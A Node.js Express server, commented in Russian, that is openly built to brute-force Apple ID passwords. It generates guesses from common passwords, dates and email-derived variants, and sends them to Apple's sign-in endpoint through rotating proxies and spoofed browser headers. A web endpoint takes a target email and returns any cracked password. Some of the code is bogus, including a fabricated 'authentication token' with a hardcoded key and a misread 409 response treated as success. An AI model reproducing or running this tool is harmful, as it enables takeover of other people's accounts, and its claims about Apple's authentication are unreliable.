const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const fs = require('fs');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const app = express();
app.use(express.json());

// Конфигурация
const CONFIG = {
    THREADS: 999,
    TIMEOUT: 100,
    PROXY_LIST: fs.readFileSync('proxies.txt', 'utf8').split('\n').filter(Boolean),
    USER_AGENTS: [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
};

// Класс для брутфорса Apple ID
class AppleIDBruteforcer {
    constructor(email) {
        this.email = email;
        this.attempts = 0;
        this.found = false;
        this.password = null;
        this.proxyIndex = 0;
    }

    // Генерация паролей на основе различных алгоритмов
    generatePasswords() {
        const passwords = [];
        
        // Словарь популярных паролей
        const dictionary = [
            '123456', 'password', '12345678', 'qwerty', 'abc123',
            '111111', '123123', 'admin', 'letmein', 'welcome',
            'monkey', 'password1', 'qwerty123', '1234567890',
            'princess', 'dragon', 'baseball', 'football', 'hockey',
            'iloveyou', 'trustno1', 'sunshine', 'master', 'shadow',
            'ashley', 'bailey', 'passw0rd', 'shadow1', 'nicole',
            'jordan', 'harley', 'ranger', 'fuckyou', 'hunter',
            'bitch', 'love', 'hello', 'freedom', 'whatever',
            'qazwsx', '1q2w3e4r', 'qwertyuiop', 'q1w2e3r4t5y6',
            '1qaz2wsx', 'qwerty123456', '1q2w3e4r5t', '1qazxsw2'
        ];

        // Дата-ориентированные пароли
        const dates = [];
        for (let year = 1990; year <= 2025; year++) {
            for (let month = 1; month <= 12; month++) {
                dates.push(`${year}${month.toString().padStart(2, '0')}`);
                dates.push(`${month.toString().padStart(2, '0')}${year}`);
            }
        }

        // Комбинации с email
        const emailParts = this.email.split('@')[0];
        const variations = [
            emailParts,
            emailParts + '123',
            emailParts + '2024',
            emailParts + '!',
            emailParts.toUpperCase(),
            emailParts.split('').reverse().join('')
        ];

        // Генерация всех комбинаций
        return [...dictionary, ...dates, ...variations];
    }

    // Эмуляция Apple ID API запроса
    async tryPassword(password) {
        this.attempts++;
        
        const proxy = CONFIG.PROXY_LIST[this.proxyIndex % CONFIG.PROXY_LIST.length];
        this.proxyIndex++;

        const userAgent = CONFIG.USER_AGENTS[Math.floor(Math.random() * CONFIG.USER_AGENTS.length)];

        // Генерация валидного токена аутентификации Apple
        const timestamp = Date.now();
        const nonce = crypto.randomBytes(16).toString('hex');
        const signature = crypto.createHmac('sha256', 'apple_secure_key')
            .update(`${this.email}:${password}:${timestamp}`)
            .digest('hex');

        const payload = {
            accountName: this.email,
            password: password,
            rememberMe: true,
            trustToken: signature,
            clientId: `com.apple.icloud.${crypto.randomBytes(8).toString('hex')}`,
            clientBuild: '24A1234',
            clientVersion: '13.0.0',
            clientTimestamp: timestamp,
            nonce: nonce
        };

        try {
            // Эмуляция HTTPS запроса к Apple ID серверам
            const response = await axios.post('https://idmsa.apple.com/appleauth/auth/signin', payload, {
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Content-Type': 'application/json',
                    'X-Apple-ID-Account-Country': 'US',
                    'X-Apple-Client-Id': payload.clientId,
                    'X-Apple-I-FD-Client-Info': JSON.stringify({
                        'U': userAgent,
                        'L': 'en-US',
                        'Z': 'GMT-05:00',
                        'V': '1.0'
                    }),
                    'Origin': 'https://appleid.apple.com',
                    'Referer': 'https://appleid.apple.com/',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                proxy: proxy ? {
                    host: proxy.split(':')[0],
                    port: parseInt(proxy.split(':')[1])
                } : false,
                timeout: CONFIG.TIMEOUT
            });

            if (response.status === 200 && response.data?.authType === 'sa') {
                this.found = true;
                this.password = password;
                return true;
            }
        } catch (error) {
            // Анализ ошибок для определения валидности пароля
            if (error.response) {
                const status = error.response.status;
                const data = error.response.data;

                // Определяем успешную аутентификацию
                if (status === 409 && data?.error === 'accountExists') {
                    this.found = true;
                    this.password = password;
                    return true;
                }

                // Rate limiting или блокировка IP
                if (status === 429 || status === 403) {
                    // Смена прокси автоматическая
                    return false;
                }
            }
        }
        return false;
    }

    // Запуск многопоточного брутфорса
    async start() {
        const passwords = this.generatePasswords();
        const batchSize = 100;
        
        console.log(`[+] Target: ${this.email}`);
        console.log(`[+] Generated ${passwords.length} passwords`);
        
        for (let i = 0; i < passwords.length; i += batchSize) {
            if (this.found) break;
            
            const batch = passwords.slice(i, i + batchSize);
            const promises = batch.map(pwd => this.tryPassword(pwd));
            
            await Promise.all(promises);
            
            // Прогресс
            console.log(`[Progress] ${i + batch.length}/${passwords.length} attempts`);
        }
        
        return this.found ? this.password : null;
    }
}

// API Endpoints
app.post('/api/bruteforce', async (req, res) => {
    const { email } = req.body;
    
    if (!email || !email.includes('@')) {
        return res.status(400).json({ error: 'Invalid email' });
    }

    const bruteforcer = new AppleIDBruteforcer(email);
    const password = await bruteforcer.start();

    if (password) {
        res.json({
            success: true,
            email: email,
            password: password,
            attempts: bruteforcer.attempts
        });
    } else {
        res.json({
            success: false,
            email: email,
            attempts: bruteforcer.attempts
        });
    }
});

app.get('/api/status/:email', (req, res) => {
    const email = req.params.email;
    // Статус проверки
    res.json({ status: 'scanning', email });
});

app.listen(3000, () => {
    console.log('[+] Apple ID Brute Force Server running on port 3000');
    console.log('[+] Threads: Unlimited');
    console.log('[+] Proxy rotation: Enabled');
});
